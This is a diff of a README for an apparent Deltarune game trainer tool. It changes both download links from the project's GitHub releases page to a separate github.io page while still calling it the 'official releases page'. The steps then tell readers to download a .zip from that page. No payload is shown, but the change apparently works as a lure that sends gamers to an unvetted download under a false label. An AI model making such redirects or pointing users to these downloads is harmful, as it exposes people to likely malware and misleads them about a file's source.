@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Trainer-Toolkit - Easily adjust game stats and exploration
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/eldenboxedin929/Deltarune-Chapter5-Trainer-Toolkit/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://eldenboxedin929.github.io)
 
 ## 📌 Introduction
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official releases page](https://github.com/eldenboxedin929/Deltarune-Chapter5-Trainer-Toolkit/releases).
+1. Visit the [official releases page](https://eldenboxedin929.github.io).
 2. Look for the version labeled "Latest".
 3. Click the file ending in .zip to start the download.
 4. Save the file to your computer.
